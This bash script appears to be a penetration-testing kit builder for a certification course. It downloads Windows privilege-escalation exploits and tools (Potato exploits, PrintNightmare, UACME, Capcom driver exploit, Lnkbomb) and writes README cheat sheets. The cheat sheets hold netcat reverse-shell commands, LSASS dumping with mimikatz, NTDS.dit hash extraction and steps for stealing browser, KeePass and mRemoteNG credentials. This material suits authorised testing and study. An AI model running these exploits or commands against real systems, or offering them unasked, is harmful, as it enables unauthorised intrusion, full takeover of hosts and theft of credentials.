#!/usr/bin/env bash
# =============================================================================
# CPTS Patch — Windows PrivEsc PoC Scripts
# Organizes exploit PoCs into subcategory folders by privilege/technique
# Also duplicated in windows/ root for quick access
# Usage: chmod +x patch_winprivesc_pocs.sh && ./patch_winprivesc_pocs.sh
# =============================================================================

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
log()     { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
info()    { echo -e "${CYAN}[*]${NC} $*"; }
section() { echo -e "\n${BOLD}${CYAN}══════ $* ══════${NC}\n"; }

WIN="$HOME/tools/transfer/windows"
PRIV="$WIN/privesc"

# Create all subcategory folders
mkdir -p \
    "$PRIV/SeImpersonatePrivilege" \
    "$PRIV/SeDebugPrivilege" \
    "$PRIV/SeTakeOwnershipPrivilege" \
    "$PRIV/SeBackupPrivilege" \
    "$PRIV/SeLoadDriverPrivilege" \
    "$PRIV/KernelExploits" \
    "$PRIV/UACBypass" \
    "$PRIV/ServiceMisconfig" \
    "$PRIV/CredentialTheft" \
    "$PRIV/Enumeration" \
    "$PRIV/DSInternals"

# Helper: download to both a subcategory folder AND windows/ root
dl_both() {
    local url="$1" subdir="$2" filename="$3"
    curl -fsSL "$url" -o "$subdir/$filename" 2>/dev/null && \
        cp "$subdir/$filename" "$WIN/$filename" && \
        log "$filename → privesc/$( basename $subdir )/ + windows/" || \
        warn "$filename: download failed — $url"
}

# Helper: copy existing file from windows/ root into subcategory
copy_to_sub() {
    local filename="$1" subdir="$2"
    if [[ -f "$WIN/$filename" ]]; then
        cp "$WIN/$filename" "$subdir/$filename"
        log "$filename duplicated → privesc/$( basename $subdir )/"
    elif [[ -d "$WIN/$filename" ]]; then
        cp -r "$WIN/$filename" "$subdir/$filename"
        log "$filename/ duplicated → privesc/$( basename $subdir )/"
    else
        warn "$filename not found in windows/ root — skipping copy to $( basename $subdir )"
    fi
}

# =============================================================================
section "1 — SeImpersonatePrivilege"
# Use when: whoami /priv shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
# Decision: Server 2019/Win10 → PrintSpoofer/RoguePotato | Server ≤2016 → JuicyPotato
# =============================================================================

cat > "$PRIV/SeImpersonatePrivilege/README.md" << 'EOF'
# SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

## When to use
`whoami /priv` shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege

## Decision tree
- Windows Server 2019 / Windows 10 → PrintSpoofer or RoguePotato
- Windows Server ≤ 2016 / Windows 10 ≤ 1809 → JuicyPotato

## Quick commands

### PrintSpoofer (Server 2019 / Win10)
```
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe <IP> <PORT> -e cmd"
```

### JuicyPotato (Server ≤ 2016)
```
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e cmd.exe" -t *
# Note: need a valid CLSID for the target OS — see https://ohpe.it/juicy-potato/CLSID/
```

### RoguePotato (Server 2019 alternative)
```
RoguePotato.exe -r <REMOTE_IP> -e "nc.exe <IP> <PORT> -e cmd.exe" -l 9999
# Requires socat redirect on attack host: socat tcp-listen:135,reuseaddr,fork tcp:<TARGET>:9999
```
EOF

# JuicyPotato
info "JuicyPotato..."
JUICY_URL=$(curl -s https://api.github.com/repos/ohpe/juicy-potato/releases/latest \
    | grep browser_download_url | grep "JuicyPotato.exe" | head -1 | cut -d'"' -f4)
[[ -n "$JUICY_URL" ]] && dl_both "$JUICY_URL" "$PRIV/SeImpersonatePrivilege" "JuicyPotato.exe" || \
    warn "JuicyPotato: check https://github.com/ohpe/juicy-potato/releases"

# PrintSpoofer
info "PrintSpoofer..."
PS_URL=$(curl -s https://api.github.com/repos/itm4n/PrintSpoofer/releases/latest \
    | grep browser_download_url | grep "x64" | head -1 | cut -d'"' -f4)
[[ -n "$PS_URL" ]] && dl_both "$PS_URL" "$PRIV/SeImpersonatePrivilege" "PrintSpoofer.exe" || \
    warn "PrintSpoofer: check https://github.com/itm4n/PrintSpoofer/releases"

# RoguePotato
info "RoguePotato..."
RP_URL=$(curl -s https://api.github.com/repos/antonioCoco/RoguePotato/releases/latest \
    | grep browser_download_url | grep ".exe" | head -1 | cut -d'"' -f4)
[[ -n "$RP_URL" ]] && dl_both "$RP_URL" "$PRIV/SeImpersonatePrivilege" "RoguePotato.exe" || \
    warn "RoguePotato: check https://github.com/antonioCoco/RoguePotato/releases"

# =============================================================================
section "2 — SeDebugPrivilege"
# Use when: whoami /priv shows SeDebugPrivilege
# → inject into SYSTEM parent process OR dump LSASS with procdump
# =============================================================================

cat > "$PRIV/SeDebugPrivilege/README.md" << 'EOF'
# SeDebugPrivilege

## When to use
`whoami /priv` shows SeDebugPrivilege (common for local admins, some service accounts)

## Techniques

### 1. psgetsys — inject into SYSTEM parent process
```powershell
# Find a SYSTEM process to use as parent
Get-Process | Where-Object {$_.SI -eq 0} | Select-Object Id, Name | head

# Run psgetsys to spawn SYSTEM shell via parent injection
Import-Module .\psgetsys.ps1
ImpersonateFromParentPid -ppid <SYSTEM_PROCESS_PID> -command "c:\windows\system32\cmd.exe" -cmdargs ""
```

### 2. procdump + mimikatz (LSASS dump)
```
# Dump LSASS (needs SeDebugPrivilege)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Parse offline on attack host
pypykatz lsa minidump lsass.dmp
```

### 3. Direct mimikatz
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```
EOF

info "psgetsys.ps1..."
curl -fsSL \
    "https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1" \
    -o "$PRIV/SeDebugPrivilege/psgetsys.ps1" && \
    cp "$PRIV/SeDebugPrivilege/psgetsys.ps1" "$WIN/psgetsys.ps1" && \
    log "psgetsys.ps1 → SeDebugPrivilege/ + windows/"

# =============================================================================
section "3 — SeTakeOwnershipPrivilege"
# Use when: whoami /priv shows SeTakeOwnershipPrivilege (even if Disabled)
# → EnableAllTokenPrivs enables it, then takeown + icacls on any file
# =============================================================================

cat > "$PRIV/SeTakeOwnershipPrivilege/README.md" << 'EOF'
# SeTakeOwnershipPrivilege

## When to use
`whoami /priv` shows SeTakeOwnershipPrivilege — even if state is Disabled

## Steps

### 1. Enable the privilege (if Disabled)
```powershell
Import-Module .\EnableAllTokenPrivs.ps1
# OR
Import-Module .\Enable-Privilege.ps1
```

### 2. Take ownership of target file
```cmd
takeown /f C:\path\to\file
```

### 3. Grant yourself full control
```cmd
icacls C:\path\to\file /grant <username>:F
```

### Common targets
- `C:\Windows\System32\config\SAM` — local hashes
- Service binary with weak permissions
- `C:\inetpub\wwwroot\web.config` — app credentials
EOF

info "EnableAllTokenPrivs.ps1..."
dl_both \
    "https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1" \
    "$PRIV/SeTakeOwnershipPrivilege" "EnableAllTokenPrivs.ps1"

info "Enable-Privilege.ps1..."
curl -fsSL \
    "https://www.powershellgallery.com/api/v2/package/Enable-Privilege" \
    -o /tmp/enable_priv.zip 2>/dev/null && \
    unzip -q -o /tmp/enable_priv.zip -d /tmp/enable_priv_dir 2>/dev/null && \
    find /tmp/enable_priv_dir -name "*.ps1" -exec cp {} "$PRIV/SeTakeOwnershipPrivilege/Enable-Privilege.ps1" \; 2>/dev/null || \
    warn "Enable-Privilege.ps1: download from https://www.powershellgallery.com/packages/Enable-Privilege"
[[ -f "$PRIV/SeTakeOwnershipPrivilege/Enable-Privilege.ps1" ]] && \
    cp "$PRIV/SeTakeOwnershipPrivilege/Enable-Privilege.ps1" "$WIN/Enable-Privilege.ps1"

# =============================================================================
section "4 — SeBackupPrivilege"
# Use when: whoami /priv shows SeBackupPrivilege
# → Copy-FileSeBackupPrivilege cmdlet bypasses ACL — grab NTDS.dit, SAM
# =============================================================================

cat > "$PRIV/SeBackupPrivilege/README.md" << 'EOF'
# SeBackupPrivilege

## When to use
`whoami /priv` shows SeBackupPrivilege — common for Backup Operators group

## Steps

### 1. Import the DLLs
```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
```

### 2. Enable the privilege
```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege  # verify enabled
```

### 3. Copy files bypassing ACL
```powershell
# Copy NTDS.dit (need VSS copy first on live DC)
$obj = New-Object -ComObject "Shell.Application"

# Or use diskshadow to create VSS copy
diskshadow.exe
  set verbose on
  set metadata C:\Windows\Temp\meta.cab
  set context clientaccessible
  begin backup
  add volume C: alias cdrive
  create
  expose %cdrive% E:
  end backup
  exit

# Then copy via SeBackupPrivilege
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# Also copy SYSTEM hive for decryption key
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Extract offline
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
EOF

info "SeBackupPrivilege DLLs..."
if [[ ! -d "$PRIV/SeBackupPrivilege/SeBackupPrivilege/.git" ]]; then
    git clone -q --depth=1 \
        https://github.com/giuliano108/SeBackupPrivilege \
        "$PRIV/SeBackupPrivilege/SeBackupPrivilege"
fi
# Copy DLLs to both locations
find "$PRIV/SeBackupPrivilege/SeBackupPrivilege" -name "*.dll" | while read dll; do
    fname=$(basename "$dll")
    cp "$dll" "$PRIV/SeBackupPrivilege/$fname"
    cp "$dll" "$WIN/$fname"
    log "$fname → SeBackupPrivilege/ + windows/"
done

# =============================================================================
section "5 — SeLoadDriverPrivilege"
# Use when: member of Print Operators or whoami /priv shows SeLoadDriverPrivilege
# → Load vulnerable Capcom.sys driver → SYSTEM shell
# =============================================================================

cat > "$PRIV/SeLoadDriverPrivilege/README.md" << 'EOF'
# SeLoadDriverPrivilege

## When to use
Member of Print Operators group, or `whoami /priv` shows SeLoadDriverPrivilege

## Steps

### 1. Enable the privilege (compile EnableSeLoadDriverPrivilege.cpp in VS)
```cmd
cl.exe /W4 /WX /Fe:EoPLoadDriver.exe EnableSeLoadDriverPrivilege.cpp
```

### 2. Use EoPLoadDriver to load Capcom.sys
```cmd
EoPLoadDriver.exe System\CurrentControlSet\MyService C:\path\to\Capcom.sys
```

### 3. Use ExploitCapcom to get SYSTEM shell
```cmd
ExploitCapcom.exe
```

## Note
Capcom.sys download: https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
This is a vulnerable signed driver — AV may flag it
EOF

info "EoPLoadDriver..."
curl -fsSL \
    "https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp" \
    -o "$PRIV/SeLoadDriverPrivilege/EoPLoadDriver.cpp" 2>/dev/null && \
    cp "$PRIV/SeLoadDriverPrivilege/EoPLoadDriver.cpp" "$WIN/EoPLoadDriver.cpp" && \
    log "EoPLoadDriver.cpp (needs compilation with cl.exe)"

info "EnableSeLoadDriverPrivilege.cpp..."
curl -fsSL \
    "https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp" \
    -o "$PRIV/SeLoadDriverPrivilege/EnableSeLoadDriverPrivilege.cpp" && \
    cp "$PRIV/SeLoadDriverPrivilege/EnableSeLoadDriverPrivilege.cpp" \
       "$WIN/EnableSeLoadDriverPrivilege.cpp" && \
    log "EnableSeLoadDriverPrivilege.cpp"

info "ExploitCapcom..."
if [[ ! -d "$PRIV/SeLoadDriverPrivilege/ExploitCapcom/.git" ]]; then
    git clone -q --depth=1 https://github.com/tandasat/ExploitCapcom \
        "$PRIV/SeLoadDriverPrivilege/ExploitCapcom"
fi
log "ExploitCapcom → SeLoadDriverPrivilege/ (needs compilation)"

# =============================================================================
section "6 — KernelExploits"
# OS-level exploits — check version/patch level first
# =============================================================================

cat > "$PRIV/KernelExploits/README.md" << 'EOF'
# Kernel / OS Exploits

## Identification workflow
1. Run winPEAS or Seatbelt first
2. Run Watson.exe for .NET-based patch enumeration
3. Feed `systeminfo` output to WES-NG or Windows-Exploit-Suggester

## Exploit reference

| CVE / Name | Affected Versions | Method |
|---|---|---|
| CVE-2021-36934 HiveNightmare | Win10 21H1 and earlier (check icacls on SAM) | Copy SAM/SYSTEM as user |
| CVE-2021-1675 PrintNightmare | All Windows with Print Spooler running | Add admin or load DLL |
| CVE-2020-0668 | Build ≤ 18363 | Arbitrary file write → SYSTEM via Mozilla Maintenance |
| MS16-032 | Win7/Server 2008 R2 SP1 missing KB3143141 | Secondary Logon Service |
| CVE-2019-1388 hhupd | Unpatched hosts with GUI access | UAC bypass via cert dialog |

## HiveNightmare check
```cmd
icacls C:\Windows\System32\config\SAM
# If BUILTIN\Users has RX — vulnerable
```

## PrintNightmare check
```powershell
ls \\localhost\pipe\spoolss  # if exists, spooler running
```
EOF

# HiveNightmare — already downloaded in winprivesc patch, copy to subdir
copy_to_sub "HiveNightmare" "$PRIV/KernelExploits"
copy_to_sub "HiveNightmare.exe" "$PRIV/KernelExploits"

# CVE-2021-1675 PrintNightmare
info "CVE-2021-1675 PrintNightmare..."
curl -fsSL \
    "https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1" \
    -o "$PRIV/KernelExploits/CVE-2021-1675.ps1" && \
    cp "$PRIV/KernelExploits/CVE-2021-1675.ps1" "$WIN/CVE-2021-1675.ps1" && \
    log "CVE-2021-1675.ps1 (PrintNightmare)"

# CVE-2020-0668
info "CVE-2020-0668..."
if [[ ! -d "$PRIV/KernelExploits/CVE-2020-0668/.git" ]]; then
    git clone -q --depth=1 \
        https://github.com/RedCursorSecurityConsulting/CVE-2020-0668 \
        "$PRIV/KernelExploits/CVE-2020-0668" && \
        log "CVE-2020-0668 (arbitrary file write as SYSTEM, build ≤ 18363)"
fi
# Copy exe if present
find "$PRIV/KernelExploits/CVE-2020-0668" -name "*.exe" | \
    xargs -I{} cp {} "$WIN/" 2>/dev/null || true

# Invoke-MS16-032 — already in windows/ root, copy to subdir
copy_to_sub "Invoke-MS16-032.ps1" "$PRIV/KernelExploits"

# Sherlock — already in windows/ root, copy to subdir
copy_to_sub "Sherlock.ps1" "$PRIV/KernelExploits"

# Windows-Exploit-Suggester — already in windows/ root, copy
copy_to_sub "Windows-Exploit-Suggester" "$PRIV/KernelExploits"

# hhupd.exe — CVE-2019-1388 UAC bypass via cert dialog
info "hhupd.exe (CVE-2019-1388)..."
HHUPD_URL=$(curl -s https://api.github.com/repos/jas502n/CVE-2019-1388/releases/latest \
    | grep browser_download_url | grep ".exe" | head -1 | cut -d'"' -f4)
if [[ -n "$HHUPD_URL" ]]; then
    curl -fsSL "$HHUPD_URL" -o "$PRIV/KernelExploits/hhupd.exe" && \
        cp "$PRIV/KernelExploits/hhupd.exe" "$WIN/hhupd.exe" && \
        log "hhupd.exe (CVE-2019-1388)"
else
    # Try direct clone
    [[ ! -d "$PRIV/KernelExploits/CVE-2019-1388/.git" ]] && \
        git clone -q --depth=1 https://github.com/jas502n/CVE-2019-1388 \
            "$PRIV/KernelExploits/CVE-2019-1388" && \
        log "CVE-2019-1388 repo (hhupd — check releases for binary)"
fi

# Watson — .NET missing patch enumeration
info "Watson..."
WATSON_URL=$(curl -s https://api.github.com/repos/rasta-mouse/Watson/releases/latest \
    | grep browser_download_url | grep ".exe" | head -1 | cut -d'"' -f4)
[[ -n "$WATSON_URL" ]] && \
    curl -fsSL "$WATSON_URL" -o "$PRIV/KernelExploits/Watson.exe" && \
    cp "$PRIV/KernelExploits/Watson.exe" "$WIN/Watson.exe" && \
    log "Watson.exe (missing patch enumeration)"

# WES-NG — better than Windows-Exploit-Suggester
info "WES-NG..."
if [[ ! -d "$PRIV/KernelExploits/wesng/.git" ]]; then
    git clone -q --depth=1 https://github.com/bitsadmin/wesng \
        "$PRIV/KernelExploits/wesng" && \
        cp -r "$PRIV/KernelExploits/wesng" "$WIN/wesng" && \
        log "wesng/ (WES-NG — feed systeminfo output for CVE suggestions)"
fi

# =============================================================================
section "7 — UACBypass"
# =============================================================================

cat > "$PRIV/UACBypass/README.md" << 'EOF'
# UAC Bypass

## When to use
Have local admin credentials but UAC is blocking elevation

## Identification
```powershell
[environment]::OSVersion.Version  # get exact build number
```

## Tools

### UACME — comprehensive by build number
Find your build number in the UACME README matrix and use the corresponding method:
```cmd
Akagi64.exe <method_number> <command>
# Example: Akagi64.exe 23 cmd.exe
```

### Bypass-UAC.ps1 — UacMethodSysprep
```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```
EOF

# UACME
info "UACME..."
if [[ ! -d "$PRIV/UACBypass/UACME/.git" ]]; then
    git clone -q --depth=1 https://github.com/hfiref0x/UACME \
        "$PRIV/UACBypass/UACME" && log "UACME/ (comprehensive UAC bypass by build number)"
fi
# Check for compiled binaries in releases
UACME_URL=$(curl -s https://api.github.com/repos/hfiref0x/UACME/releases/latest \
    | grep browser_download_url | head -1 | cut -d'"' -f4)
[[ -n "$UACME_URL" ]] && \
    curl -fsSL "$UACME_URL" -o /tmp/uacme_release.zip && \
    unzip -q -o /tmp/uacme_release.zip -d "$PRIV/UACBypass/UACME_bin" 2>/dev/null && \
    log "UACME binaries extracted"

# Bypass-UAC already in windows/ root — copy to subdir
copy_to_sub "Bypass-UAC.ps1" "$PRIV/UACBypass"

# =============================================================================
section "8 — ServiceMisconfig"
# =============================================================================

cat > "$PRIV/ServiceMisconfig/README.md" << 'EOF'
# Service Misconfiguration Exploitation

## When to use
After landing on a host — run automated enumeration first, then verify manually

## Workflow
1. Run PowerUp.ps1 or SharpUp.exe for automated discovery
2. Use accesschk.exe to manually verify permissions on leads
3. Exploit: weak service ACL, unquoted path, AlwaysInstallElevated, or modifiable binary

## PowerUp quick commands
```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# AlwaysInstallElevated — generates UserAdd.msi
Write-UserAddMSI

# Weak service ACL — change binary path
Invoke-ServiceAbuse -ServiceName <name> -UserName <domain\user>
```

## SharpUp
```cmd
SharpUp.exe audit
```

## accesschk — verify service permissions manually
```cmd
# IMPORTANT: First run requires EULA accept
accesschk.exe /accepteula

# Check service permissions
accesschk.exe -ucqv <ServiceName>

# Find all services current user can modify
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv %username% *
```

## accesschk EULA registry key (auto-accept)
The included Sysinternals_EULA.reg file pre-accepts the EULA.
Import it before running: `reg import Sysinternals_EULA.reg`
EOF

# Write Sysinternals EULA reg file so accesschk doesn't prompt
cat > "$PRIV/ServiceMisconfig/Sysinternals_EULA.reg" << 'REGEOF'
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Sysinternals\AccessChk]
"EulaAccepted"=dword:00000001

[HKEY_CURRENT_USER\Software\Sysinternals\PsExec]
"EulaAccepted"=dword:00000001

[HKEY_CURRENT_USER\Software\Sysinternals\Procdump]
"EulaAccepted"=dword:00000001

[HKEY_CURRENT_USER\Software\Sysinternals\Sysmon]
"EulaAccepted"=dword:00000001
REGEOF
cp "$PRIV/ServiceMisconfig/Sysinternals_EULA.reg" "$WIN/Sysinternals_EULA.reg"
log "Sysinternals_EULA.reg (import to auto-accept EULA for all Sysinternals tools)"

# accesschk
info "accesschk.exe..."
curl -fsSL \
    "https://live.sysinternals.com/accesschk64.exe" \
    -o "$PRIV/ServiceMisconfig/accesschk.exe" && \
    cp "$PRIV/ServiceMisconfig/accesschk.exe" "$WIN/accesschk.exe" && \
    log "accesschk.exe (Sysinternals — EULA pre-accepted via reg file)"

# SharpUp
info "SharpUp.exe..."
SHARPUP_URL=$(curl -s https://api.github.com/repos/GhostPack/SharpUp/releases/latest \
    | grep browser_download_url | grep ".exe" | head -1 | cut -d'"' -f4)
if [[ -n "$SHARPUP_URL" ]]; then
    curl -fsSL "$SHARPUP_URL" -o "$PRIV/ServiceMisconfig/SharpUp.exe" && \
        cp "$PRIV/ServiceMisconfig/SharpUp.exe" "$WIN/SharpUp.exe" && \
        log "SharpUp.exe"
else
    # SharpUp compiled binary from Ghostpack
    curl -fsSL \
        "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe" \
        -o "$PRIV/ServiceMisconfig/SharpUp.exe" && \
        cp "$PRIV/ServiceMisconfig/SharpUp.exe" "$WIN/SharpUp.exe" && \
        log "SharpUp.exe (from Ghostpack compiled binaries)"
fi

# PowerUp already in windows/ root — copy to subdir
copy_to_sub "PowerUp.ps1" "$PRIV/ServiceMisconfig"

# =============================================================================
section "9 — CredentialTheft"
# =============================================================================

cat > "$PRIV/CredentialTheft/README.md" << 'EOF'
# Credential Theft

## Decision tree

| Situation | Tool |
|---|---|
| Chrome/Chromium credentials | SharpChrome.exe or Invoke-SharpChromium.ps1 |
| Firefox cookies | cookieextractor.py (copy cookies.sqlite first) |
| mRemoteNG confCons.xml found | mremoteng_decrypt.py (default master pass: mR3m) |
| .kdbx KeePass file found | keepass2john → hashcat -m 13400 |
| PuTTY/WinSCP/RDP saved sessions | SessionGopher.ps1 |
| User actively on machine | Invoke-ClipboardLogger.ps1 |
| File share with write access | Responder + Lnkbomb (Server 2019+) or SCF (older) |

## keepass2john
```bash
# On Kali
keepass2john database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```

## SharpChrome
```cmd
SharpChrome.exe logins
SharpChrome.exe cookies
```

## mremoteng_decrypt
```bash
python3 mremoteng_decrypt.py -s <encrypted_string>
# or
python3 mremoteng_decrypt.py -f confCons.xml
```

## cookieextractor
```bash
# Copy cookies.sqlite from: %APPDATA%\Mozilla\Firefox\Profiles\*.default\
python3 cookieextractor.py cookies.sqlite
```
EOF

# Copy all credential theft tools already in windows/ root
for f in SharpChrome.exe Invoke-SharpChromium.ps1 mremoteng_decrypt.py \
          cookieextractor.py SessionGopher.ps1 Invoke-ClipboardLogger.ps1 \
          firefox_decrypt.py LaZagne.exe; do
    copy_to_sub "$f" "$PRIV/CredentialTheft"
done

# Lnkbomb — NTLMv2 hash capture via malicious .lnk (Server 2019+ replacement for SCF)
info "Lnkbomb..."
if [[ ! -d "$PRIV/CredentialTheft/Lnkbomb/.git" ]]; then
    git clone -q --depth=1 https://github.com/dievus/lnkbomb \
        "$PRIV/CredentialTheft/Lnkbomb" && \
        cp -r "$PRIV/CredentialTheft/Lnkbomb" "$WIN/Lnkbomb" && \
        log "Lnkbomb/ (malicious .lnk for NTLMv2 capture — Server 2019+ SCF replacement)"
fi

# =============================================================================
section "10 — Enumeration"
# =============================================================================

cat > "$PRIV/Enumeration/README.md" << 'EOF'
# Post-Exploitation Enumeration

## Recommended order
1. winPEAS — comprehensive automated scan
2. Seatbelt — deeper host recon (installed software, interesting files, creds)
3. Watson — missing patch enumeration (.NET)
4. WES-NG — feed systeminfo for CVE suggestions
5. JAWS — use on legacy hosts where winPEAS fails (PowerShell 2.0 compatible)
6. Snaffler — after domain access, crawl shares for credentials/sensitive files

## Quick commands

### winPEAS
```cmd
winPEASx64.exe
winPEASx64.exe quiet        # less output
winPEASx64.exe systeminfo   # just system info section
```

### Seatbelt
```cmd
Seatbelt.exe -group=all
Seatbelt.exe -group=user    # user-focused checks
Seatbelt.exe CredEnum       # just credential locations
```

### Watson
```cmd
Watson.exe
```

### WES-NG (run on Kali)
```bash
python3 wes.py systeminfo.txt
python3 wes.py systeminfo.txt --impact "Elevation of Privilege"
```

### JAWS
```powershell
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

### Snaffler (domain joined)
```cmd
Snaffler.exe -s -o snaffler.log
```
EOF

# Copy enumeration tools already in windows/ root
for f in winPEASx64.exe winPEASx86.exe winPEAS.bat Seatbelt.exe SharpHound.exe \
          SharpHound.ps1 Snaffler.exe Watson.exe; do
    copy_to_sub "$f" "$PRIV/Enumeration"
done

copy_to_sub "wesng" "$PRIV/Enumeration"

# JAWS
info "JAWS.ps1..."
curl -fsSL \
    "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1" \
    -o "$PRIV/Enumeration/jaws-enum.ps1" && \
    cp "$PRIV/Enumeration/jaws-enum.ps1" "$WIN/jaws-enum.ps1" && \
    log "jaws-enum.ps1 (legacy host enumeration — PowerShell 2.0 compatible)"

# =============================================================================
section "11 — DSInternals"
# Use when: have NTDS.dit copy — offline hash extraction
# =============================================================================

cat > "$PRIV/DSInternals/README.md" << 'EOF'
# DSInternals — Offline NTDS.dit Analysis

## When to use
You have a copy of NTDS.dit (from DC backup, VSS, or SeBackupPrivilege)

## Setup (on target Windows machine)
```powershell
Import-Module .\DSInternals\DSInternals.psd1
```

## Extract hashes from offline NTDS.dit
```powershell
# Get the boot key from SYSTEM hive
$key = Get-BootKey -SystemHivePath 'C:\Temp\SYSTEM'

# Extract all accounts
Get-ADDBAccount -All -DatabasePath 'C:\Temp\ntds.dit' -BootKey $key

# Extract specific user
Get-ADDBAccount -SamAccountName Administrator -DatabasePath 'C:\Temp\ntds.dit' -BootKey $key
```

## Alternative: impacket-secretsdump (on Kali — faster)
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
EOF

info "DSInternals..."
DSINT_URL=$(curl -s https://api.github.com/repos/MichaelGrafnetter/DSInternals/releases/latest \
    | grep browser_download_url | grep "PSModule" | head -1 | cut -d'"' -f4)
if [[ -n "$DSINT_URL" ]]; then
    curl -fsSL "$DSINT_URL" -o /tmp/dsint.zip && \
        unzip -q -o /tmp/dsint.zip -d "$PRIV/DSInternals" && \
        cp -r "$PRIV/DSInternals" "$WIN/DSInternals_module" && \
        log "DSInternals PowerShell module"
else
    [[ ! -d "$PRIV/DSInternals/repo/.git" ]] && \
        git clone -q --depth=1 \
            https://github.com/MichaelGrafnetter/DSInternals \
            "$PRIV/DSInternals/repo" && \
        log "DSInternals (from git — check releases for compiled module)"
fi

# =============================================================================
section "12 — Privilege Abuse PoC README (root level)"
# =============================================================================

cat > "$PRIV/README.md" << 'EOF'
# Windows Privilege Escalation PoC Scripts

## Folder Structure

| Folder | Privilege / Technique |
|---|---|
| `SeImpersonatePrivilege/` | JuicyPotato, PrintSpoofer, RoguePotato |
| `SeDebugPrivilege/` | psgetsys (parent injection), LSASS dump |
| `SeTakeOwnershipPrivilege/` | EnableAllTokenPrivs, Enable-Privilege |
| `SeBackupPrivilege/` | Copy-FileSeBackupPrivilege DLLs → NTDS.dit |
| `SeLoadDriverPrivilege/` | EoPLoadDriver + ExploitCapcom |
| `KernelExploits/` | HiveNightmare, PrintNightmare, MS16-032, Watson, WES-NG |
| `UACBypass/` | UACME (by build number), Bypass-UAC.ps1 |
| `ServiceMisconfig/` | PowerUp, SharpUp, accesschk |
| `CredentialTheft/` | SharpChrome, mremoteng_decrypt, SessionGopher, Lnkbomb |
| `Enumeration/` | winPEAS, Seatbelt, Watson, JAWS, Snaffler |
| `DSInternals/` | Offline NTDS.dit hash extraction |

## Quick Decision Reference

```
whoami /priv output:
  SeImpersonatePrivilege
    Server 2019 / Win10      → PrintSpoofer.exe -i -c cmd
    Server ≤ 2016            → JuicyPotato.exe

  SeDebugPrivilege           → psgetsys.ps1 (parent injection)
                             → procdump lsass → pypykatz

  SeTakeOwnershipPrivilege   → EnableAllTokenPrivs.ps1 → takeown → icacls

  SeBackupPrivilege          → SeBackupPrivilege DLLs → Copy-FileSeBackupPrivilege

  SeLoadDriverPrivilege      → EoPLoadDriver → Capcom.sys → ExploitCapcom.exe

net localgroup / group membership:
  Backup Operators           → SeBackupPrivilege path above
  Print Operators            → SeLoadDriverPrivilege path above
  DnsAdmins                  → dnscmd dll injection

Automated enumeration finds:
  Weak service ACL           → PowerUp Invoke-ServiceAbuse
  Unquoted service path      → PowerUp Write-ServiceBinary
  AlwaysInstallElevated      → PowerUp Write-UserAddMSI
  Missing patches            → Watson → WES-NG → KernelExploits/

Credential opportunities:
  Chrome/Chromium            → SharpChrome.exe
  Firefox cookies            → cookieextractor.py
  mRemoteNG confCons.xml     → mremoteng_decrypt.py
  .kdbx file                 → keepass2john → hashcat -m 13400
  Saved sessions             → SessionGopher.ps1
  File share write access    → Responder + Lnkbomb
```
EOF

log "Master README.md created at privesc/"

# =============================================================================
section "DONE"
# =============================================================================

echo ""
log "Privesc folder structure:"
find "$PRIV" -maxdepth 2 -name "*.exe" -o -name "*.ps1" -o -name "*.py" \
    -o -name "*.dll" -o -name "*.cpp" 2>/dev/null | \
    sed "s|$PRIV/||" | sort | column
echo ""
log "Run: bash deep_verify.sh to confirm transfer files"
